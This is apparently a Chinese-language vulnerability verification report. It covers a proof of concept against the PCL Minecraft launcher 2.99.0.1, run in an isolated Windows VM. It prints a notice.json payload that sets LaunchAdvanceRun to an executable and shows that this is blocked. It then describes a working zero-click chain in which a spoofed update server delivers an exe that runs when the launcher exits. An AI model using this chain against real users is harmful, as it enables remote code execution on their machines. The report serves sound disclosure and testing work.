# PCL 2.99.0.1 公告/静默更新 PoC：Windows VM 动态验证

日期：2026-10-25
环境：QEMU 11.1.2 + KVM，Windows 10 Enterprise LTSC 2021 x64 en-US，4 vCPU / 4 GB，
无网卡，1920×1080。VM 位于 `~/.HHD/PCLPoC-VM`（私有，不随仓库分发）。

## 结论

| 链路 | 结果 |
|---|---|
| 方法一：`notice.json -> setup -> LaunchAdvanceRun` | **BLOCKED**：2.99.0.1 的黑名单抛出 `被禁止的设置项：LaunchAdvanceRun`，payload 未执行 |
| 方法二：`notice.cfg + slientupdate -> ServerConfig -> update.zip -> PCL\Plain Craft Launcher 2.exe` | **SUCCESS**：零点击；PCL 正常退出时执行下载的 4096 字节 exe，marker 与哈希均吻合 |

这次是动态复跑，不是静态 diff。方法一被拦、方法二仍可用，和复查报告的判断一致。

## 样本

```text
PCL 正式版 2.99.0.1.zip
  sha256 4d239a62ed66fb9ebcf4633fd881eb098e9a7e4f296f0e414b58aa2f1f7f7830
Plain Craft Launcher 2.exe (2.99.0.1)
  sha256 0db34e19d9eeb6d496d20fabe786ec16bbd36ba6b0ccdc8d29cb7e909c114397
```

## 方法一：现场被拦截

PoC 以 `-Mode launch` 启动，`notice.json` 顶层 `actions.setup` 写入：

```json
{"LaunchAdvanceRun":"C:\\Users\\Public\\pclpoc.exe","LaunchAdvanceRunWait":"False"}
```

PCL 2.99.0.1 在处理 `setup` 时命中黑名单。`evidence/method1/Log1.txt` 第 62–65 行：

```text
03:05:49.865 E <22 · L/PCL 配置更新> [ModSecret] 执行 PCL 服务器公告动作失败（setup, {
03:05:49.865 E <22 · L/PCL 配置更新> [ModSecret]   "LaunchAdvanceRun": "C:\\Users\\Public\\pclpoc.exe",
03:05:49.865 E <22 · L/PCL 配置更新> [ModSecret]   "LaunchAdvanceRunWait": "False"
03:05:49.865 E <22 · L/PCL 配置更新> [ModSecret] }）：被禁止的设置项：LaunchAdvanceRun
```

- `evidence/method1/poc-run.log`：`[-] No marker file was produced.`
- `%TEMP%\pcl-poc-marker.txt` 不存在。
- 这正是复查报告说的 12 键黑名单：`LaunchAdvanceRun` 在第一位。

## 方法二：仍然零点击成功

`server.ps1` 返回：

```text
notice.cfg      11002|0|0|0|999
ServerConfig    Update.Release.DownloadUrls -> https://.../update.zip
update.zip      Plain Craft Launcher 2.exe (4096 bytes)
```

PCL 把 zip 解压到 `PCL\Plain Craft Launcher 2.exe`（staging），正常退出时
`UpdateRestart` 启动它。结果：

```text
marker:
2026-10-25T03:06:35.7399399+08:00 pid=2264 args=--update 2444 Plain Craft Launcher 2.exe Plain Craft Launcher 2.exe False

staged exe      4096 bytes
staging sha256  DA949D1F40D1DD40BA80C0CEEAB43278EDA92FA680A0551ACAFF0E39BC12CB6D
zip entry sha256 DA949D1F40D1DD40BA80C0CEEAB43278EDA92FA680A0551ACAFF0E39BC12CB6D
hash match      the downloaded zip entry ran.
calc.exe        started (visible on the right)
```

- `evidence/marker.txt`：原始 marker。
- `evidence/staging.exe`、`evidence/zip-entry.exe`：同一 4096 字节 payload。
- `evidence/staging.sha256.txt`：payload 哈希。
- `evidence/method2/poc-run.log`、`method2/server.out.log`：下载/退出/执行时间线。
- `evidence/RESULT.txt`：PCL 自己写出的结果摘要。
- `evidence/final-desktop.png`：终端、`RESULT.txt` Notepad、Calculator 同屏。

## 录屏与逐帧

- 合成视频：[`pcl-2.99.0.1-poc-demo.mp4`](pcl-2.99.0.1-poc-demo.mp4)
  - 1920×1080，2:03，H.264，烧录中文字幕；字幕源 [`demo.srt`](demo.srt)。
  - 时间线：step1 00:00 → 方法一 00:56 → 方法二 01:17 → 结论 01:51。
- 关键截图：
  - [`stills/method1-blocked.jpg`](stills/method1-blocked.jpg)
  - [`stills/method2-success.jpg`](stills/method2-success.jpg)
  - [`stills/final-desktop.png`](stills/final-desktop.png)
- **逐帧原始素材**：`vm/frames/final3/`，1434 张 1920×1080 JPEG（8 fps）+
  `index.csv`（帧号/epoch 毫秒），约 270 MB。**已保留，未删除。**
  - `frames-index.csv` 是本目录里的索引副本。
  - 另外保留的 take：`vm/frames/final`、`final2`（布局调试版，未删除）。
- 视频只取 step1 到 end+12s（帧 101–1087），未删除任何源帧。

## 证据文件

```text
evidence/
├── RESULT.txt                  PCL 侧结果摘要
├── marker.txt                  方法二执行证明
├── staging.exe                 下载并执行的 4096 字节 payload
├── zip-entry.exe               update.zip 里的同名 exe
├── staging.sha256.txt
├── Notice.cfg / Setup.ini
├── Log1.txt                    当前 PCL 日志
├── demo-timeline.csv           7 步演示时间线（epoch 毫秒）
├── demo.log                    布局/分辨率/步骤记录
├── demo-transcript.txt
├── method1/
│   ├── Log1.txt                方法一被拦截的完整日志（第 62–65 行）
│   ├── poc-run.log
│   └── server.out.log
└── method2/
    ├── Log1.txt
    ├── poc-run.log
    ├── server.out.log
    ├── staging.exe
    ├── zip-entry.exe
    └── update.zip
```

`demo.log` 记录的计算布局：

```text
[03:05:04] resolution=1920x1080 screen=1920x1020 console=918x1020 pcl=998
```

由于 Windows 控制台字体在 150% DPI 下实际更宽，最终画面里终端约 0–1190 px，
PCL/Calculator/Notepad 位于约 1250–1920 px；两者留有空隙、互不遮挡。PCL 通过
`HIGHDPIAWARE` 兼容标记按 100% 渲染，右侧完整可见。可对照
`stills/method1-blocked.jpg`、`stills/method2-success.jpg` 和
`stills/final-desktop.png`。

## 复现包

完整可分发脚本在仓库根目录的 [`repeat/`](../../../repeat/README.md)：

- `build-toolkit.sh`：生成 MBR + FAT32 工具盘（含 autounattend/演示脚本/PoC）。
- `run-vm.sh`：`install` / `demo` 两个阶段；USB 必须 `removable=on`，否则 Setup 不读
  `autounattend.xml`。
- `record.sh` / `record.py`：QMP `screendump` 逐帧录制。
- `extract-evidence.sh`：关机后从 FAT 镜像取 `pcl-test/evidence`。
- `make-video.sh` / `make_srt.py`：按 `demo-timeline.csv` 裁切、烧字幕。
- `toolkit/`：无人值守 XML、演示脚本、PoC 脚本（**不含 `certs/` 私钥**）。

复现包不含 Windows ISO、PCL zip、CA 私钥或主机用户名；VM 磁盘中的 lab CA 私钥属于
运行时实验材料，`~/.HHD/PCLPoC-VM` 应保持私有。

## 备注与限制

- 方法一在 2.99.0.1 上**必然被拦**；本视频如实展示“尝试 → 被拦 → 方法二成功”。
  若要看 `LaunchAdvanceRun` 真正执行，需要 2.99.0.0 + 可启动的 Minecraft 实例，
  不在本复现包范围内。
- 录制使用 Administrator 审核模式桌面（OOBE/自动登录在 LTSC 上不稳定）；画面中的
  `C:\Users\Administrator` 是通用实验室账户，不含个人信息。
- LTSC 2021 的 Calculator 是 UWP 应用；payload 的 `calc.exe` 成功拉起，
  画面右侧可见。
- 逐帧目录约 270 MB，未纳入 git；保留在本机 `vm/frames/final3/`。
